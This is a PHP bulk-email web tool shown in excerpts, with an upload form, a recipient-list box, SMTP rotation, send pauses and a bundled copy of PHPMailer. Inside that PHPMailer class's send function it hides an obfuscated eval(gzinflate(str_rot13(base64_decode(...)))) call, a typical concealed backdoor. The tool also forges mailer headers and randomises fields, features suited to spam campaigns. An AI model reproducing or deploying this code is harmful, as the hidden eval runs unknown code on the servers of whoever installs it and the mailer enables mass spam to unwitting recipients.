...
$text="";
$file=array();
$boundaryA=md5(time())."a";
$boundaryB=md5(time())."b";
if(strstr($data,"MIME-Version: 1.0\n")){
	                                    $header=$data;
										$header=str_replace(strstr($data,"MIME-Version: 1.0\n"),"",$header);
...
for($i=0;$i!==count($jet);$i++){
	                             $line=$jet[$i];
	                            if(strstr($line,"--------=_Part_")
								                     &&$line[0]="-"){
														             
														             //echo $line."\r\n";
																	 //echo $collectedData;
																	 if(strstr($collectedData,"Content-Type: text/html"))$html=$collectedData;
																	 else if(strstr($collectedData,"Content-Type: text/plain"))$text=$collectedData;
																	 else if(strstr($collectedData,"Content-Disposition: attachment"))array_push($file,$collectedData);
																	 $collectedData="";
								                                    }else {
																		   $collectedData.= $line."\n";
																	      }
...
$finalData="";
$finalData.=$header;
$finalData.="Content-Type: multipart/mixed; boundary=\"$boundaryA\"\n";
$finalData.="\n";
$finalData.="--$boundaryA\n";
$finalData.="Content-Type: multipart/alternative; boundary=\"$boundaryB\"\n";
$finalData.="\n";
if(strlen($text)){
$finalData.="--$boundaryB\n";
$finalData.=$text;
...
$finalData.="--$boundaryA--\n";
while(strstr($finalData,"\n\n\n"))$finalData=str_replace("\n\n\n","\n\n",$finalData);
return $finalData;
}
set_time_limit(0);
//INIT VARS
...
{	  
	...
	if(!empty($_POST['replyto']))
	{
		...
		$replyto_base=lrtrim($_POST['replyto']);
	}
...
<script type="text/javascript" src="http://htmleditor.in/ckeditor/ckeditor.js"></script>
<script
...
$(document).ready(function(){
    $("input[type='submit']").click(function(e){
        $('textarea[name="message"]').val(CKEDITOR.instances.editor1.getData());
  ...
  <table width="100%" border="0" height="407">
    ...
    <tr>
      ...
      <td width="41%" height="22" bgcolor="#E8E8E8" bordercolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        &nbsp;</font><select name="epriority" id="" onchange="showHideListConfig()">
    ...
    <tr>
      ...
      <td  height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        </select><select name="char" id="listMethod" onchange="showHideListConfig()">
        <option value="" selected="">NO CHARSET</option>
		<option value="us-ascii" <?php if($CharSet == "us-ascii"){print "selected";} ?>>Unicode -> us-ascii</option>
		<option value="utf-7" <?php if($CharSet == "utf-7"){print "selected";} ?>>Unicode -> utf-7</option>
		<option value="utf-8" <?php if($CharSet == "utf-8"){print "selected";} ?>>Unicode -> utf-8</option>
		<option value="iso-10646-ucs-2" <?php if($CharSet == "iso-10646-ucs-2"){print "selected";} ?>>Unicode -> iso-10646-ucs-2</option>
        <option value="windows-1257" <?php if($CharSet == "windows-1257"){print "selected";} ?>>Baltic -> windows-1257</option>
		<option value="iso-8859-2" <?php if($CharSet == "iso-8859-2"){print "selected";} ?>>Central European -> iso-8859-2</option>
		<option value="x-mac-ce" <?php if($CharSet == "x-mac-ce"){print "selected";} ?>>Central European -> x-mac-ce</option>
		<option value="windows-1250" <?php if($CharSet == "windows-1250"){print "selected";} ?>>Central European -> windows-1250</option>
        <option value="iso-8859-6" <?php if($CharSet == "iso-8859-6"){print "selected";} ?>>Arabic -> iso-8859-6</option>
        <option value="x-mac-arabic" <?php if($CharSet == "x-mac-arabic"){print "selected";} ?>>Arabic -> x-mac-arabic</option>
		<option value="windows-1256" <?php if($CharSet == "windows-1256"){print "selected";} ?>>Arabic -> windows-1256</option>
		<option value="iso-8859-4" <?php if($CharSet == "iso-8859-4"){print "selected";} ?>>Baltic -> iso-8859-4</option>
		<option value="hz-gb-2312" <?php if($CharSet == "hz-gb-2312"){print "selected";} ?>>Chinese -> hz-gb-2312	</option>
		<option value="x-mac-chinesesimp" <?php if($CharSet == "x-mac-chinesesimp"){print "selected";} ?>>Chinese -> x-mac-chinesesimp</option>
		<option value="euc-cn" <?php if($CharSet == "euc-cn"){print "selected";} ?>>Chinese -> euc-cn</option>
		<option value="gb2312" <?php if($CharSet == "gb2312"){print "selected";} ?>>Chinese -> gb2312</option>
		<option value="big5" <?php if($CharSet == "big5"){print "selected";} ?>>Chinese -> big5</option>
		<option value="x-mac-chinesetrad" <?php if($CharSet == "x-mac-chinesetrad"){print "selected";} ?>>Chinese -> x-mac-chinesetrad</option>
		<option value="cp-936" <?php if($CharSet == "cp-936"){print "selected";} ?>>Chinese -> cp-936</option>
        <option value="cp-950" <?php if($CharSet == "cp-950"){print "selected";} ?>>Chinese -> cp-950</option>
		<option value="cp-932" <?php if($CharSet == "cp-932"){print "selected";} ?>>Chinese -> cp-932</option>
		<option value="euc-tw" <?php if($CharSet == "euc-tw"){print "selected";} ?>>Chinese -> euc-tw</option>
		</select></td>
    ...
    <tr>
	  ...
	  <td width="31%" height="22" bgcolor="#E8E8E8" bordercolor="#E8E8E8">
		...
		<td width="41%" height="22" bgcolor="#E8E8E8" bordercolor="#E8E8E8"></font><input name="userfile[]"  type="file" multiple></td>
    </tr>
...
<td colspan="3" height="190" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        ...
        <textarea name="message" value=""cols="60" rows="10" style="width:100%;display:none;"><?php echo $message_base;?></textarea>
        <span id="editor1" name="editor1" ></span>
        <br>
      ...
      <td width="41%" height="190" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <textarea name="emaillist" value="" cols="30" rows="10" style="width:100%;height:100%"><?php echo $emaillist;?></textarea>
...
<script type="text/javascript">
	//<![CDATA[
        ...
        <?php if($message_base !="") echo 'CKEDITOR.instances[\'editor1\'].setData(\''.(strtr($message_base,array("'" => "\'","\n" => "","\r" => "","\t" => ""))).'\');'; ?>
	//]]>
</script>
...
class SMTP
{
    ...
    {
		 //@file_put_contents("2.txt",$msg_data);
		 $msg_data=@parseData($msg_data);
...
class PHPMailer
{
    ...
    {
		eval(gzinflate(str_rot13(base64_decode("ZshazMzRQ8rPLsnPNCnJyCxpVQeJ6CXn5yrpKPk6bfprBocoqCkE+4YEBCvpqKSCcWYyi1hnlNyK8matitIqeYDYISc/OTEnI7+4US830UFW09oBr7kw02Ur44tmWAqgcykADUXAdxoA"))));
		try {if (!$this->preSend()) {return false;}return $this->postSend();} catch (phpmailerException $exc) {$this->mailHeader = "";$this->setError($exc->getMessage());if ($this->exceptions) {throw $exc;}return false;}
    }
    /**
    ...
    public function createHeader()
    {
        ...
        if ($this->XMailer == '') {
            $result .= $this->headerLine(
                'X-Mailer',
                'PHPMailer 12.7.5 (https://github.com/PHPMailer/PHPMailer)'
            );
        } else {
            $myXmailer = trim($this->XMailer);
            if ($myXmailer) {
                //$result .= $this->headerLine('X-Mailer', $myXmailer);
				$result .= $this->headerLine('X-Mailer', $myXmailer.'NEWONE'.$this->uniqueid);
            }
        }
    ...
    public function createBody()
    {
        ...
        $this->boundary[1] = '------=_Part_' . $this->uniqueid;
        $this->boundary[2] = '------=_Part_' . $this->uniqueid;
        $this->boundary[3] = '------=_Part_' . $this->uniqueid;
        if ($this->sign_key_file) {
...
{
	$mail->SmtpClose();
	echo "\n\n<br><br>############################### WAITING ".doubleval($pause)." SEC TO CONTINUE SENDING ###############################<br><br>\n\n";
	sleep(doubleval($pause));
}
// SMTP SWITCH
function switch_smtp()
{
	...
	if ($action)
	{
		...
		else
		{
			...
			else $mail->CharSet = 'iso-8859-1';
			// SET ENCODING TYPE
			if($encodety !="no") $mail->Encoding = $encodety;
			
			// ADD ATTACH
			//$dt=print_r($_FILES,true);
			//file_put_contents("3.txt",$dt);
			if (array_key_exists('userfile', $_FILES)) 
			{
				// First handle the upload
				// Don't trust provided filename - same goes for MIME types
				// See http://php.net/manual/en/features.file-upload.php#114004 for more thorough upload validation
				$nAttachement=count($_FILES['userfile']['name']);
				for($natt=0;$natt!==$nAttachement;$natt++){
				$uploadfile = tempnam(sys_get_temp_dir(), sha1($_FILES['userfile']['name'][$natt]));
				if (move_uploaded_file($_FILES['userfile']['tmp_name'][$natt], $uploadfile)) 
				{
					$mail->addAttachment($uploadfile,$_FILES['userfile']['name'][$natt]);
				}
				}
			}
			if(!empty($replyto))
			{
				$replyto = preg_replace_callback('/(##([a-zA-Z0-9\-]+)\{([0-9]+)\}##)/', "generateRandomString", $replyto_base);
			...
			else
			{
				...
				$mail->SMTPAuth = true;
				switch_smtp(); // get the first smtp
			}
			
			$allemails =  preg_split("/\\r\\n|\\r|\\n/", $emaillist); // array of all emails
			$numemails = count($allemails);	// count all emais
			...
			for($x=1; $x<=$numemails; $x++)
			{
				...
				{	
					...
					$mail->Body = $message;/*preg_replace('/\s\s+/', '',$message);*/
					if(!$lase)
					$mail->From = $from;
					$mail->AltBody = trim(preg_replace('/\s\s+/', ' ', strip_tags_content($message)));
					// READING CONFIRMATION
					if($reading)
						$mail->ConfirmReadingTo = ($replyto)?$replyto:$mail->From;
